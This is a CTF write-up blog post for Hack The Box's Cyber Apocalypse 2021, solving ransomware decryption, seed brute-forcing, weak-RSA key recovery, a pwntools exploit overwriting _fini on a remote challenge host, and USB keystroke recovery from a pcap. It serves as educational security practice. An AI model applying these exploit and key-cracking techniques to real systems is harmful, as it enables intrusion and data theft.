---
title: "Cyber Apocalypse 2021"
header:
  teaser: /assets/images/2021-cyber-apocalypse/CyberApoc-Logo.png
excerpt_separator: "<!--more-->"
categories:
  - CTF
tags:
  - Reversing
  - Crypto
  - Ghidra
  - Forensics
---

[Hack the Box](https://hackthebox.eu/) hosted this amazing CTF. Team sizes were limited to 10 players. Since we we had a lot of interest from Hack South CTF players, we decided to entered two teams: HackSouth and HackSouthToo 😁. The teams were isolated from each other on our Discord server and the two ended up solving very different challenges from one another.

I hoped for our team to finish in the top 100, but we ended up just missing the mark at 106th.<!--more-->

## Alienware (Reversing)

Alienware was a ransomware Win64 EXE that needed to be reversed to decrypt a provided encrypted PDF. Once the logic was understood, I wrote some C++ to do the decryption. The encryption key is derived from the target's OS name. Instead of replicating the keying code, I debugged the ransomware in x64dbg and grabbed the 16-byte key from memory.

Note that this is the longest continuous C++ I have ever written so it is probably terrible, but it's beautiful to me ♥.

```cpp
#include <iostream>
#include <Windows.h>
#include <wincrypt.h>

int main()
{
    HCRYPTPROV cryptor;
    HCRYPTHASH hasher;
    HCRYPTKEY actual_key;
    HANDLE fhCrypt, fhSaved;
    DWORD wide_strlen, file_size, total_read, bytes_read, bytes_written, err;
    BOOL check, file_end;
    char file_buffer[0x30]{};

    const wchar_t* key_wide = L"\x2F\x6B\x18\xE4\x9A\x33\xD9\xC7\xA0\x31\x46\x1F\x16\x66\x19\xF7";
    const wchar_t* provider_type = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
    const wchar_t* cryptFile = L"C:\\CTF\\rev_alienware\\Confidential.pdf.alien";
    const wchar_t* savedFile = L"C:\\CTF\\rev_alienware\\Confidential.pdf";

    try
    {
        wide_strlen = lstrlenW(key_wide);
        if (wide_strlen != 0x10)
            throw std::logic_error("Length expected to be 0x10\n");

        if (CryptAcquireContextW(&cryptor, NULL, provider_type, 0x18, 0xf0000000) == 0)
            throw std::logic_error("Could not acquire context\n");

        if (CryptCreateHash(cryptor, CALG_SHA_256, 0, 0, &hasher) == 0)
            throw std::logic_error("Failed to create hasher.\n");

        if (CryptHashData(hasher, (BYTE*)key_wide, wide_strlen, NULL) == 0)
            throw std::logic_error("Failed to create hash data.\n");

        if (CryptDeriveKey(cryptor, 0x660e, hasher, NULL, &actual_key) == 0)
            throw std::logic_error("Failed to derive crypto key.\n");

        fhCrypt = CreateFileW(cryptFile, 0x80000000, 1, (LPSECURITY_ATTRIBUTES)0x0, 3, 0x8000000, (HANDLE)0x0);
        if (fhCrypt <= 0)
            throw std::logic_error("Error opening file for reading.\n");

        fhSaved = CreateFileW(savedFile, 0x40000000, 0, (LPSECURITY_ATTRIBUTES)0x0, 2, 0x80, (HANDLE)0x0);
        if (fhCrypt <= 0)
            throw std::logic_error("Error opening file for writing.\n");

        file_size = GetFileSize(fhCrypt, (LPDWORD)0x0);
        total_read = 0;
        file_end = false;
        check = ReadFile(fhCrypt, &file_buffer, 0x30, &bytes_read, (LPOVERLAPPED)0x0);
        while (check && bytes_read > 0)
        {
            total_read += bytes_read;
            if (total_read == file_size)
                file_end = true;

            check = CryptDecrypt(actual_key, 0, file_end, 0, (BYTE*)&file_buffer, &bytes_read);
            //check = CryptEncrypt(actual_key, 0, file_end, 0, (BYTE*)&file_buffer, &bytes_read, 0x30);
            if (!check)
            {
                err = GetLastError();
                throw std::logic_error("Error decrypting file.\n");
            }

            check = WriteFile(fhSaved, &file_buffer, bytes_read, &bytes_written, NULL);
            if (!check)
                throw std::logic_error("Error writing file.\n");

            check = ReadFile(fhCrypt, &file_buffer, 0x30, &bytes_read, (LPOVERLAPPED)0x0);
            if (!check)
                throw std::logic_error("Error reading file.\n");
        }

        CryptReleaseContext(cryptor, 0);
        CryptDestroyKey(actual_key);
        CryptDestroyHash(hasher);
        CloseHandle(fhCrypt);
        CloseHandle(fhSaved);
    }
    catch (std::logic_error e)
    {
        std::cout<<(e.what());
    }
}
```

## SoulCrabber 2 (Crypto)

The first SoulCrabber challenge used a static PRNG seed to encrypt a message in Rust using simple XOR. The same code could be used to reverse the decryption, because the seed was known.

SoulCrabber 2 made it more difficult by using the current system time (in seconds) as the seed. I solved this challenge by writing Rust code brute force the seed value. It starts with the current time and works back, second by second, assuming the message was encrypted in the past. If any decrypted value starts with `CHTB{` then we know we have succeeded.

Solution in the first Rust code I have ever written:

```rust
use rand::{Rng,SeedableRng};
use rand::rngs::StdRng;
use std::time::SystemTime;

fn get_latest() -> u64 {
    return SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .expect("Time is broken")
        .as_secs();
}

fn get_rng(seed: u64) -> StdRng {
    return StdRng::seed_from_u64(seed);
}

fn rand_xor(input: Vec<u8>) -> String {
    let mut latest = get_latest();
    let mut rng = get_rng(latest);
    let mut output: String;

    loop {
        output = input.clone()
            .into_iter()
            .map(|c| format!("{:02x}", (c as u8 ^ rng.gen::<u8>())))
            .collect::<Vec<String>>()
            .join("");

        latest -= 1;
        rng = get_rng(latest);

        // Check if it starts with HEX for "CHTB{"
        if output.starts_with("434854427b") {
            break output;
        }

        if latest < 1609488000 {
            break "nope".to_string();
        }
    }
}

fn main() -> std::io::Result<()> {
    let encoded = hex::decode("418a5175c38caf8c1cafa92cde06539d512871605d06b2d01bbc1696f4ff487e9d46ba0b5aaf659807").expect("Some error");
    let xored = rand_xor(encoded);
    println!("{}", xored);
    Ok(())
}
```

## Low Energy Crypto (Forensics)

The challenge provides a packet capture for a Bluetooth Low Energy (BLE) device. One of the messages contains a public key and another seems to contain cryptext (or possibly random bytes).

```
-----BEGIN PUBLIC KEY-----
MGowDQYJKoZIhvcNAQEBBQADWQAwVgJBAKKPHxnmkWVC4fje7KMbWZf07zR10D0m
B9fjj4tlGkPOW+f8JGzgYJRWboekcnZfiQrLRhA3REn1lUKkRAnUqAkCEQDL/3Li
4l+RI2g0FqJvf3ff
-----END PUBLIC KEY-----
```

This is a short public key, but still 512-bits. Not having anything else to go on, I fed it to RsaCtfTool and got a hit on FactorDB!

```
➜  ./RsaCtfTool.py --publickey cert.txt --private

[*] Testing key cert.txt.
[*] Performing pastctfprimes attack on cert.txt. | 113/113 [00:00<00:00, 1711033.76it/s]
[*] Performing mersenne_primes attack on cert.txt. | 51/51 [00:01<00:00, 35.68it/s]
[*] Performing factordb attack on cert.txt.
[*] Attack success with factordb method !

Results for cert.txt:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIIBRwIBAAJBAKKPHxnmkWVC4fje7KMbWZf07zR10D0mB9fjj4tlGkPOW+f8JGzg
YJRWboekcnZfiQrLRhA3REn1lUKkRAnUqAkCEQDL/3Li4l+RI2g0FqJvf3ffAkBY
f1ugn3b6H1bdtLy+J6LCgPH+K1E0clPrprjPjFO1pPUkxafxs8OysMDdT5VBx7dZ
RSLx7cCfTVWRTKSjwYKPAiEAy/9y4uJfkSNoNBaib393y3GZu+QkufE43A3BMLPC
ED8CIQDL/3Li4l+RI2g0FqJvf3fLcZm75CS58TjcDcEws8I1twIgJXpkF+inPgZE
TjVKdec6UGg75ZwW3WTPEoVANux3DscCIDjx+RSYECVaraeGG2O/v8iKe6dn1GpM
VGUuaKecISArAiA0QRYkZFB5D4BnOxGkMX3ihjn7NFPQ7+Jk/abWRRq6+w==
-----END RSA PRIVATE KEY-----
```

I then used CyberChef to decrypt the message using this private key to get the flag.

![CyberChef Decrypted Flag](/assets/images/2021-cyber-apocalypse/CyberApoc-BLE.png){:.align-center}

## Mindfield (PWN)

Mindfield was ret2win challenge which pushed me to learn a new approach...

`No PIE` meant the function addresses will stay static and Ghidra showed a function called `_` which printed the flag. We need to somehow redirect execution to that point in the code.

```shell
➜  pwn_mindfield checksec minefield
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

After reading the decompiled code in Ghidra, I realised that the application takes two Int64 values:
* A memory address to change,
* and the value to change it to.

This seemed easy... I could just hijack the global offset table (GOT) for an imported function. When that function gets called, the target code would execute.

But then I realised no imported functions were called after the arbitrary write 🤔. I dug in to learn about Linux application finalisation and found that the address for `_fini` can be overwritten at runtime even though NX is enabled. Setting it to the `_` function address caused the flag to show when the application tried to unwind and exit.

My exploit code:

```python
#!/usr/bin/env python3
from pwn import *

#context.log_level = 'DEBUG'

elf = ELF('./minefield')

#gdb_cmd = ['b *mission', 'c']
#t = gdb.debug(elf.file.name, '\n'.join(gdb_cmd))
t = remote('188.166.156.174', 32680)

t.recvuntil(b'> ')
t.sendline(b'2')

t.recvuntil(b'mine: ')
buff = str(int(0x6010a8)).encode() # _fini address
t.send(buff)

t.recvuntil(b'plant: ')
buff = str(int(elf.symbols['_'])).encode()
t.send(buff)

print(t.recvall())
````

## Key Mission (Forensics)

This challenge provided a USB HID capture of keystrokes. It had to be reconstructed to find the flag typed by the user. Backspaces and uppercasing made it tricky...

My first step was to get the keystroke data from the pcap into a text file that I could read.

```shell
tshark -r key_mission.pcap -Y '!(usbhid.data == 00:00:00:00:00:00:00:00)' -T fields -e usbhid.data | grep -v "^$" > data.txt
```

The resulting file had 360 lines of values looking like `02002d0000000000`. I then looked for some keymaps to interpret the data and found a [relevant write-up from a previous CTF](https://ctftime.org/writeup/17233).

```python
newmap = {
	2: "^",		4: "a",			5: "b",				6: "c",
	7: "d",		8: "e",			9: "f",				10: "g",
	11: "h",	12: "i",		13: "j",			14: "k",
	15: "l",	16: "m",		17: "n",			18: "o",
	19: "p",	20: "q",		21: "r",			22: "s",
	23: "t",	24: "u",		25: "v",			26: "w",
	27: "x",	28: "y",		29: "z",			30: "1",
	31: "2",	32: "3",		33: "4",			34: "5",
	35: "6",	36: "7",		37: "8",			38: "9",
	39: "0",	40: "ENTER",	41: "ESC",			42: "DEL",
	43: "TAB",	44: " ",		45: "-",			46: "=",
	47: "[",	48: "]",		52: "'",			55: ".",
	56: "/",	57: "CapsLock",	79: "RightArrow",	80: "LeftArrow"
}

myKeys = open("data.txt")
for line in myKeys:
    bytesArray = bytearray.fromhex(line.strip())
    for byte in bytesArray:
        if byte != 0:
            keyVal = int(byte)

            if keyVal in newmap:
                print(newmap[keyVal], end='')
            else:
                print("\n*NO MAP: " + str(keyVal), end='')
```

Running the code outputted a semi-readable message:

```
➜  forensics_key_mission python3 test.py
^^i^ aamm sseendinfgDELDELg sseecrreetary's loccaation oveerr this tottaally encrypted channel to make surree no one elssee will be able to  rrreeeaatDELDELdd itt  excepptt of us. ^^tthis informmaaattion iss  confiddeential and must not be sharreed with anyone elssee. ^^tthe  ssseecrreetary's hidden loocccaation is ^^c^^h^^t^^b^^[^a^^-^place=3DELDEL-3DELDEL^^-^3DELDELDEL3^^-^f^^a^r^^-^f^^aar^^-^awwaay^^-^ffrr0m^^-^eeaarth^^]^ENTER
```

My keymap was not perfect but I did not want to spend more time on this challenge. `^^` looked like shift. `DEL` looked like backspace. Some letters had duplicates. I got the key after some manual cleanup: `CHTB{a_plac3_fAr_fAr_away_fr0m_earth}`
